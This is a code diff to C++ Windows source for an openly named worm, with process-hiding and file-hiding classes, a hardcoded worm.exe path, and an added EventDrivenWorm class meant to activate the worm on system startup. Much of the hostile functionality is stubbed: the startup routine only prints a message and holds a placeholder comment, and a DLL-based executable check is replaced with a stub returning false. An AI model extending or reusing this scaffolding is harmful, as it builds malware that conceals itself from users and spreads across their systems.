@@ -8,6 +8,9 @@
 #include <TlHelp32.h>
 #include <Shellapi.h>
 
+// Declaration of IsValidExecutableFunc
+typedef bool (*IsValidExecutableFunc)(const std::string&);
+
 namespace fs = std::filesystem;
 
 class ProcessHider {
@@ -95,20 +98,16 @@ public:
     }
 
     static bool IsValidExecutable(const std::string& filePath) {
-        HINSTANCE dllHandle = LoadLibrary("isValidExecutable.dll");
-        if (dllHandle == NULL) {
-            return false;
-        }
+        // Placeholder implementation
+        return false;
+    }
+};
 
-        IsValidExecutableFunc isValidExecutable = (IsValidExecutableFunc)GetProcAddress(dllHandle, "isValidExecutable");
-        if (isValidExecutable == NULL) {
-            FreeLibrary(dllHandle);
-            return false;
-        }
-
-        bool result = isValidExecutable(filePath);
-        FreeLibrary(dllHandle);
-        return result;
+class EventDrivenWorm {
+public:
+    static void ActivateOnStartup() {
+        std::cout << "Worm activated on system startup." << std::endl;
+        // Insert worm activation code here
     }
 };
 
@@ -135,6 +134,9 @@ public:
         ProcessEnumerator::HideWormProcess();
         FileHider::HideWormFile("C:\\Users\\User\\Documents\\worm.exe");
 
+        // Activate worm on system startup
+        EventDrivenWorm::ActivateOnStartup();
+
         while (true) {
             Sleep(1000);
         }
@@ -142,5 +144,3 @@ public:
         return 0;
     }
 };
-
-
